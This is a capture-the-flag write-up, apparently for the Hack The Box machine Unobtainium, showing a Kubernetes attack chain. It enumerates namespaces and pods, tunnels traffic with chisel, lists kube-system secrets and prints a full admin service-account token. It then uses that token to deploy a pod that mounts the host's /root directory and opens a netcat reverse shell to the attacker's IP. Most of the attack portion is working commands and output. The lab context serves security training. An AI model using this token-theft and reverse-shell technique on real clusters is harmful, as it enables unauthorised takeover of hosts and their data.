# Cron Deleting Kubectl

![unobtainium.htb](https://0xdedinfosec.github.io/hackthebox/unobtainium/cmd10.png)

* Let's copy kubectl to the machine and enumerate kubernetes
* We need to modify the binary name so it's not deleted by the cron

```bash
./kubectl1 get namespaces
NAME              STATUS   AGE
default           Active   164d
dev               Active   164d
kube-node-lease   Active   164d
kube-public       Active   164d
kube-system       Active   164d
```

```bash
./kubectl1 get pods -n dev
NAME                                READY   STATUS    RESTARTS   AGE
devnode-deployment-cd86fb5c-6ms8d   1/1     Running   28         163d
devnode-deployment-cd86fb5c-mvrfz   1/1     Running   29         163d
devnode-deployment-cd86fb5c-qlxww   1/1     Running   29         163d
```

```bash
./kubectl1 describe pod devnode-deployment-cd86fb5c-mvrfz -n dev
Name:         devnode-deployment-cd86fb5c-mvrfz
Namespace:    dev
Priority:     0
Node:         unobtainium/10.10.10.235
Start Time:   Sun, 17 Jan 2021 18:16:21 +0000
Labels:       app=devnode
              pod-template-hash=cd86fb5c
Annotations:  <none>
Status:       Running
IP:           172.17.0.4
IPs:
  IP:           172.17.0.4
Controlled By:  ReplicaSet/devnode-deployment-cd86fb5c
Containers:
  devnode:
    Container ID:   docker://c22506564a563249c28d652b01851710368180d88071e024a491fdd7eccb3598
    Image:          localhost:5000/node_server
    Image ID:       docker-pullable://localhost:5000/node_server@sha256:f3bfd2fc13c7377a380e018279c6e9b647082ca590600672ff787e1bb918e37c
    Port:           3000/TCP
    Host Port:      0/TCP
    State:          Running
      Started:      Tue, 29 Jun 2021 18:36:44 +0000
    Last State:     Terminated
      Reason:       Error
      Exit Code:    137
      Started:      Wed, 24 Mar 2021 16:01:31 +0000
      Finished:     Wed, 24 Mar 2021 16:02:12 +0000
    Ready:          True
    Restart Count:  29
    Environment:    <none>
    Mounts:
      /var/run/secrets/kubernetes.io/serviceaccount from default-token-rmcd6 (ro)
Conditions:
  Type              Status
  Initialized       True 
  Ready             True 
  ContainersReady   True 
  PodScheduled      True 
Volumes:
  default-token-rmcd6:
    Type:        Secret (a volume populated by a Secret)
    SecretName:  default-token-rmcd6
    Optional:    false
QoS Class:       BestEffort
Node-Selectors:  <none>
Tolerations:     node.kubernetes.io/not-ready:NoExecute op=Exists for 300s
                 node.kubernetes.io/unreachable:NoExecute op=Exists for 300s
Events:          <none>
``` 

# Using chisel to forward traffic
On Host

```bash
./chisel server -p 9999 --reverse
2021/06/30 14:16:39 server: Reverse tunnelling enabled
2021/06/30 14:16:39 server: Fingerprint KtiZQomCmbqDydsZTzAmn7dM1Yc7Q4IXbR1BnupfOxk=
2021/06/30 14:16:39 server: Listening on http://0.0.0.0:9999
```

On Target

```bash
./chisel client 10.10.14.16:9999 R:3000:172.17.0.4:3000
2021/06/30 18:17:58 client: Connecting to ws://10.10.14.16:9999
2021/06/30 18:17:58 client: Connected (Latency 43.57514ms)
```

# Executing the initial exploit on 127.0.0.1:3000

[[10 - Unobtainium]]


# Enumeration 172.17.0.4

```bash
root@devnode-deployment-cd86fb5c-mvrfz:/tmp# ./kubectl1 auth can-i list secrets -n kube-system
yes
```

```bash
root@devnode-deployment-cd86fb5c-mvrfz:/tmp# ./kubectl1 get secrets -n kube-system
NAME                                             TYPE                                  DATA   AGE
attachdetach-controller-token-5dkkr              kubernetes.io/service-account-token   3      164d
bootstrap-signer-token-xl4lg                     kubernetes.io/service-account-token   3      164d
c-admin-token-tfmp2                              kubernetes.io/service-account-token   3      163d
certificate-controller-token-thnxw               kubernetes.io/service-account-token   3      164d
clusterrole-aggregation-controller-token-scx4p   kubernetes.io/service-account-token   3      164d
coredns-token-dbp92                              kubernetes.io/service-account-token   3      164d
cronjob-controller-token-chrl7                   kubernetes.io/service-account-token   3      164d
daemon-set-controller-token-cb825                kubernetes.io/service-account-token   3      164d
default-token-l85f2                              kubernetes.io/service-account-token   3      164d
deployment-controller-token-cwgst                kubernetes.io/service-account-token   3      164d
disruption-controller-token-kpx2x                kubernetes.io/service-account-token   3      164d
endpoint-controller-token-2jzkv                  kubernetes.io/service-account-token   3      164d
endpointslice-controller-token-w4hwg             kubernetes.io/service-account-token   3      164d
endpointslicemirroring-controller-token-9qvzz    kubernetes.io/service-account-token   3      164d
expand-controller-token-sc9fw                    kubernetes.io/service-account-token   3      164d
generic-garbage-collector-token-2hng4            kubernetes.io/service-account-token   3      164d
horizontal-pod-autoscaler-token-6zhfs            kubernetes.io/service-account-token   3      164d
job-controller-token-h6kg8                       kubernetes.io/service-account-token   3      164d
kube-proxy-token-jc8kn                           kubernetes.io/service-account-token   3      164d
namespace-controller-token-2klzl                 kubernetes.io/service-account-token   3      164d
node-controller-token-k6p6v                      kubernetes.io/service-account-token   3      164d
persistent-volume-binder-token-fd292             kubernetes.io/service-account-token   3      164d
pod-garbage-collector-token-bjmrd                kubernetes.io/service-account-token   3      164d
pv-protection-controller-token-9669w             kubernetes.io/service-account-token   3      164d
pvc-protection-controller-token-w8m9r            kubernetes.io/service-account-token   3      164d
replicaset-controller-token-bzbt8                kubernetes.io/service-account-token   3      164d
replication-controller-token-jz8k8               kubernetes.io/service-account-token   3      164d
resourcequota-controller-token-wg7rr             kubernetes.io/service-account-token   3      164d
root-ca-cert-publisher-token-cnl86               kubernetes.io/service-account-token   3      164d
service-account-controller-token-44bfm           kubernetes.io/service-account-token   3      164d
service-controller-token-pzjnq                   kubernetes.io/service-account-token   3      164d
statefulset-controller-token-z2nsd               kubernetes.io/service-account-token   3      164d
storage-provisioner-token-tk5k5                  kubernetes.io/service-account-token   3      164d
token-cleaner-token-wjvf9                        kubernetes.io/service-account-token   3      164d
ttl-controller-token-z87px                       kubernetes.io/service-account-token   3      164d
```


```bash
./kubectl1 describe secrets/c-admin-token-tfmp2 -n kube-system
Name:         c-admin-token-tfmp2
Namespace:    kube-system
Labels:       <none>
Annotations:  kubernetes.io/service-account.name: c-admin
              kubernetes.io/service-account.uid: 2463505f-983e-45bd-91f7-cd59bfe066d0

Type:  kubernetes.io/service-account-token

Data
====
ca.crt:     1066 bytes
namespace:  11 bytes
token:      eyJhbGciOiJSUzI1NiIsImtpZCI6IkpOdm9iX1ZETEJ2QlZFaVpCeHB6TjBvaWNEalltaE1ULXdCNWYtb2JWUzgifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJrdWJlLXN5c3RlbSIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VjcmV0Lm5hbWUiOiJjLWFkbWluLXRva2VuLXRmbXAyIiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQubmFtZSI6ImMtYWRtaW4iLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC51aWQiOiIyNDYzNTA1Zi05ODNlLTQ1YmQtOTFmNy1jZDU5YmZlMDY2ZDAiLCJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6a3ViZS1zeXN0ZW06Yy1hZG1pbiJ9.Xk96pdC8wnBuIOm4Cgud9Q7zpoUNHICg7QAZY9EVCeAUIzh6rvfZJeaHucMiq8cm93zKmwHT-jVbAQyNfaUuaXmuek5TBdY94kMD5A_owFh-0kRUjNFOSr3noQ8XF_xnWmdX98mKMF-QxOZKCJxkbnLLd_h-P2hWRkfY8xq6-eUP8MYrYF_gs7Xm264A22hrVZxTb2jZjUj7LTFRchb7bJ1LWXSIqOV2BmU9TKFQJYCZ743abeVB7YvNwPHXcOtLEoCs03hvEBtOse2POzN54pK8Lyq_XGFJN0yTJuuQQLtwroF3579DBbZUkd4JBQQYrpm6Wdm9tjbOyGL9KRsNow
```


```bash
./kubectl1 --token=eyJhbGciOiJSUzI1NiIsImtpZCI6IkpOdm9iX1ZETEJ2QlZFaVpCeHB6TjBvaWNEalltaE1ULXdCNWYtb2JWUzgifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJrdWJlLXN5c3RlbSIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VjcmV0Lm5hbWUiOiJjLWFkbWluLXRva2VuLXRmbXAyIiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQubmFtZSI6ImMtYWRtaW4iLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC51aWQiOiIyNDYzNTA1Zi05ODNlLTQ1YmQtOTFmNy1jZDU5YmZlMDY2ZDAiLCJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6a3ViZS1zeXN0ZW06Yy1hZG1pbiJ9.Xk96pdC8wnBuIOm4Cgud9Q7zpoUNHICg7QAZY9EVCeAUIzh6rvfZJeaHucMiq8cm93zKmwHT-jVbAQyNfaUuaXmuek5TBdY94kMD5A_owFh-0kRUjNFOSr3noQ8XF_xnWmdX98mKMF-QxOZKCJxkbnLLd_h-P2hWRkfY8xq6-eUP8MYrYF_gs7Xm264A22hrVZxTb2jZjUj7LTFRchb7bJ1LWXSIqOV2BmU9TKFQJYCZ743abeVB7YvNwPHXcOtLEoCs03hvEBtOse2POzN54pK8Lyq_XGFJN0yTJuuQQLtwroF3579DBbZUkd4JBQQYrpm6Wdm9tjbOyGL9KRsNow cluster-info
Kubernetes control plane is running at https://10.96.0.1:443
KubeDNS is running at https://10.96.0.1:443/api/v1/namespaces/kube-system/services/kube-dns:dns/proxy

To further debug and diagnose cluster problems, use 'kubectl cluster-info dump'.
```

# Shellcode.yaml

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: some-pod
  namespace: default
spec:
  containers:
    - name: web
      image: localhost:5000/dev-alpine
      command: ["/bin/sh"]
      args: ["-c", "nc 10.10.14.16 4242 -e /bin/sh"]
      volumeMounts:
      - mountPath: /root/
        name: root-flag
  volumes:
  - hostPath:
      path: /root/
      type: ""
    name: root-flag
```


# Reverse shell

```bash
./kubectl1 create -f podshell.yaml --token=eyJhbGciOiJSUzI1NiIsImtpZCI6IkpOdm9iX1ZETEJ2QlZFaVpCeHB6TjBvaWNEalltaE1ULXdCNWYtb2JWUzgifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJrdWJlLXN5c3RlbSIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VjcmV0Lm5hbWUiOiJjLWFkbWluLXRva2VuLXRmbXAyIiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQubmFtZSI6ImMtYWRtaW4iLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC51aWQiOiIyNDYzNTA1Zi05ODNlLTQ1YmQtOTFmNy1jZDU5YmZlMDY2ZDAiLCJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6a3ViZS1zeXN0ZW06Yy1hZG1pbiJ9.Xk96pdC8wnBuIOm4Cgud9Q7zpoUNHICg7QAZY9EVCeAUIzh6rvfZJeaHucMiq8cm93zKmwHT-jVbAQyNfaUuaXmuek5TBdY94kMD5A_owFh-0kRUjNFOSr3noQ8XF_xnWmdX98mKMF-QxOZKCJxkbnLLd_h-P2hWRkfY8xq6-eUP8MYrYF_gs7Xm264A22hrVZxTb2jZjUj7LTFRchb7bJ1LWXSIqOV2BmU9TKFQJYCZ743abeVB7YvNwPHXcOtLEoCs03hvEBtOse2POzN54pK8Lyq_XGFJN0yTJuuQQLtwroF3579DBbZUkd4JBQQYrpm6Wdm9tjbOyGL9KRsNow
pod/some-pod created
```